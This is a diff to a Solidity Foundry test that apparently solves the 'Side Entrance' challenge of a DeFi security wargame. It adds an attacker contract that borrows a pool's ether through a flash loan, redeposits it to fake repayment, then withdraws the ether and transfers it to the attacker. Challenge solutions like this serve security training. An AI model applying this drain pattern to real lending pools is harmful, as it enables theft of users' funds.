@@ -6,6 +6,29 @@ import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
+contract AttackerContract {
+    address lenderPool;
+    address attacker;
+
+    function callFlashLoan(address _lenderPool, uint256 amount) public {
+        lenderPool = _lenderPool;
+        SideEntranceLenderPool(_lenderPool).flashLoan(amount);
+    }
+
+    function execute() external payable {
+        SideEntranceLenderPool(lenderPool).deposit{value: msg.value}();
+    }
+
+    function withdraw(address _attacker) public {
+        SideEntranceLenderPool(lenderPool).withdraw();
+        attacker = _attacker;
+        payable(attacker).transfer(address(this).balance);
+    }
+    receive() external payable {}
+
+}
+
+
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
@@ -34,7 +57,9 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        AttackerContract attackerContract =  new AttackerContract();
+        attackerContract.callFlashLoan(address(sideEntranceLenderPool),ETHER_IN_POOL);
+        attackerContract.withdraw(attacker);
         /** EXPLOIT END **/
         validation();
     }
